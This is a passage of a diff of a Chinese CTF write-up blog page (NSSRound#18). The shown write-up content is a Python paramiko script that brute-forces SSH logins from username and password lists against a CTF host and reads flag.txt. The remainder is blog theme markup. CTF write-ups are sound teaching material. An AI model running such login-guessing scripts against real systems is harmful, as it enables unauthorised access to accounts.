class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置主机信息</span></span><br><span class="line">hostname = <span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span></span><br><span class="line">port = <span class="number">28591</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取用户名和密码列表</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;wordlist.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> user_file:</span><br><span class="line">    usernames = user_file.read().splitlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;10.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> pass_file:</span><br><span class="line">    passwords = pass_file.read().splitlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保用户名和密码列表长度相同</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(usernames) == <span class="built_in">len</span>(passwords), <span class="string">&quot;用户名和密码数量不匹配&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试登录并执行命令</span></span><br><span class="line"><span class="keyword">for</span> username, password <span class="keyword">in</span> <span class="built_in">zip</span>(usernames, passwords):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 初始化SSH客户端</span></span><br><span class="line">        client = paramiko.SSHClient()</span><br><span class="line">        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 尝试连接</span></span><br><span class="line">        client.connect(hostname, port, username, password, timeout=<span class="number">10</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 执行ls命令</span></span><br><span class="line">        stdin, stdout, stderr = client.exec_command(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">        output = stdout.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查是否存在flag.txt</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag.txt&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">            <span class="comment"># 读取flag.txt内容</span></span><br><span class="line">            stdin, stdout, stderr = client.exec_command(<span class="string">&#x27;cat flag.txt&#x27;</span>)</span><br><span class="line">            flag_content = stdout.read().decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;找到flag: <span class="subst">&#123;flag_content&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;在用户 <span class="subst">&#123;username&#125;</span> 的目录中没有找到flag.txt&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> paramiko.AuthenticationException:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;登录失败：用户名 <span class="subst">&#123;username&#125;</span> 或密码错误&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;发生错误：<span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        client.close()</span><br></pre></td></tr></table></figure></div>
 
 
 
 
 
-<p>参考链接：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6645?time__1311=n4+xnD0DRDBGitN47KDsA3xCqbu75eD9AQ=oD&alichlgref=https://www.baidu.com/link?url=A-_IFOUlIylJIvrt12kXZxAyQ2f2S3p-psE9bObB9i-3sfMgYghL6qEvFbu98k-Q&wd=&eqid=f2850db1072b3e270000000265cc33af">https://xz.aliyun.com/t/6645?time__1311=n4%2BxnD0DRDBGitN47KDsA3xCqbu75eD9AQ%3DoD&amp;alichlgref=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DA-_IFOUlIylJIvrt12kXZxAyQ2f2S3p-psE9bObB9i-3sfMgYghL6qEvFbu98k-Q%26wd%3D%26eqid%3Df2850db1072b3e270000000265cc33af</a></p>
+<p>参考链接：<a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6645?time__1311=n4+xnD0DRDBGitN47KDsA3xCqbu75eD9AQ=oD&alichlgref=https://www.baidu.com/link?url=A-_IFOUlIylJIvrt12kXZxAyQ2f2S3p-psE9bObB9i-3sfMgYghL6qEvFbu98k-Q&wd=&eqid=f2850db1072b3e270000000265cc33af" >https://xz.aliyun.com/t/6645?time__1311=n4%2BxnD0DRDBGitN47KDsA3xCqbu75eD9AQ%3DoD&amp;alichlgref=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DA-_IFOUlIylJIvrt12kXZxAyQ2f2S3p-psE9bObB9i-3sfMgYghL6qEvFbu98k-Q%26wd%3D%26eqid%3Df2850db1072b3e270000000265cc33af<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
+		</div>
 
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> NSSRound#18部分wp</li>
+        <li><strong>作者:</strong> j1ya</li>
+        <li><strong>创建于
+                :</strong> 2024-02-16 19:42:42</li>
         
-  <a href="/categories/%E6%AF%94%E8%B5%9Bwp/" class="category-chain-item">比赛wp</a>
-  
-  
+            <li>
+                <strong>更新于
+                    :</strong> 2026-01-09 11:06:28
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://redefine.ohevan.com/2024/02/16/NSSRound18部分wp/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
 
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/unity%E9%80%86%E5%90%91/" class="print-no-link">#unity逆向</a>
-      
-        <a href="/tags/VM/" class="print-no-link">#VM</a>
-      
-        <a href="/tags/shellcode/" class="print-no-link">#shellcode</a>
-      
-    </div>
-  
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
 </div>
 
+		</div>
+		
 
-              
-  
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/unity%E9%80%86%E5%90%91/">#unity逆向</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/VM/">#VM</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/shellcode/">#shellcode</a>&nbsp;
+			</li>
+			
+		</ul>
+		
 
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>NSSRound#18部分wp</div>
-      <div>https://j1ya-22.github.io/2024/02/16/NSSRound18部分wp/</div>
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">IDA显示中文字符</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">二进制文件存在但仍有FileNotFoundError</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
     </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>j1ya</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2024年2月16日</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>许可协议</div>
-          <div>
+    
+
+        
             
-              
-              
-                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                    <i class="iconfont icon-by"></i>
-                  </span>
-                </a>
-              
-            
-          </div>
-        </div>
-      
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.js';
 
+      (function() {
+        const startPath = location.pathname;
+        const startTime = Date.now();
+        const retryDelay = 200;
+        const retryLimit = 5000;
 
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/" title="IDA显示中文字符">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">IDA显示中文字符</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/" title="二进制文件存在但仍有FileNotFoundError">
-                        <span class="hidden-mobile">二进制文件存在但仍有FileNotFoundError</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-  
-  
-    <article id="comments" lazyload>
-      
-  <div id="valine"></div>
-  <script type="text/javascript">
-    Fluid.utils.loadComments('#valine', function() {
-      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
-        var options = Object.assign(
-          {"appId":"5oPqGOgpqzM186wdJq3YyrcV-gzGzoHsz","appKey":"tdZv3tC3tP1IszSKxEodRe6e","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
-          {
-            el: "#valine",
-            path: window.location.pathname
+        const runWaline = () => {
+          if (location.pathname !== startPath) {
+            return;
           }
-        )
-        new Valine(options);
-        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
-          var imgSelector = '#valine .vcontent img:not(.vemoji)';
-          Fluid.plugins.imageCaption(imgSelector);
-          Fluid.plugins.fancyBox(imgSelector);
-        })
-      });
-    });
-  </script>
-  <noscript>Please enable JavaScript to view the comments</noscript>
+
+          const container = document.getElementById('waline');
+          if (!container) {
+            if (Date.now() - startTime < retryLimit) {
+              setTimeout(runWaline, retryDelay);
+            }
+            return;
+          }
+
+          if (window.redefineWalineInstance?.destroy) {
+            window.redefineWalineInstance.destroy();
+          }
+
+          container.innerHTML = '';
+          window.redefineWalineInstance = init({
+            el: '#waline',
+            serverURL: 'https://example.example.com',
+            path: location.pathname,
+            dark: 'body[class~="dark-mode"]',
+            reaction: false,
+            requiredMeta: ['nick', 'mail'],
+            emoji: [],
+                      lang: 'zh-CN',
+          });
+        };
+
+        runWaline();
+      })();
+    </script>
 
 
-    </article>
-  
 
+        
+    
+</div>
 
-          </article>
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">NSSRound#18部分wp</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HappyCTF"><span class="nav-text">HappyCTF</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#re"><span class="nav-text">re</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E7%A0%81"><span class="nav-text">编码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GenshinWishSimulator"><span class="nav-text">GenshinWishSimulator</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90"><span class="nav-text">新年快乐</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%85%92%E5%90%A7"><span class="nav-text">酒吧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#number7"><span class="nav-text">number7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#userssss"><span class="nav-text">userssss</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">j1ya</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 79 篇文章
+                    </span>
+                    
+                </p>
+            
         </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header">
-    <i class="iconfont icon-list"></i>
-    <span>目录</span>
-  </p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
         </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="图片查看器">
+	<button class="image-viewer-close" type="button" aria-label="关闭">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="上一页">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="关闭">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="下一页">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
 </div>
 
-    
 
-    
-  </main>
+	
 
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
-    </div>
-  
-  
-    <div class="statistics">
-  
-  
-
-  
-    
-      <span id="busuanzi_container_site_pv" style="display: none">
-        总访问量 
-        <span id="busuanzi_value_site_pv"></span>
-         次
-      </span>
-    
-    
-      <span id="busuanzi_container_site_uv" style="display: none">
-        总访客数 
-        <span id="busuanzi_value_site_uv"></span>
-         人
-      </span>
-    
-    
-  
-</div>
-
-  
-  
-  
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
+</main>
 
 
 
+<script src="/js/build/libs/Swup.min.js"></script>
 
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
 
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
 
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
 
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
 
-  
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
 <script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
     });
-  });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
 </script>
 
 
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
 
 
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
+	
+<script src="/js/build/main.js" type="module"></script>
 
 
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
 
+    
+<script src="/js/build/libs/odometer.min.js"></script>
 
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script defer src="/js/leancloud.js" ></script>
-
-  <script  src="/js/local-search.js" ></script>
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
 
 
 
 
 
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
 
 
   
+<script src="/js/build/libs/Typed.min.js"></script>
 
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
+
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
 </body>
+
 </html>
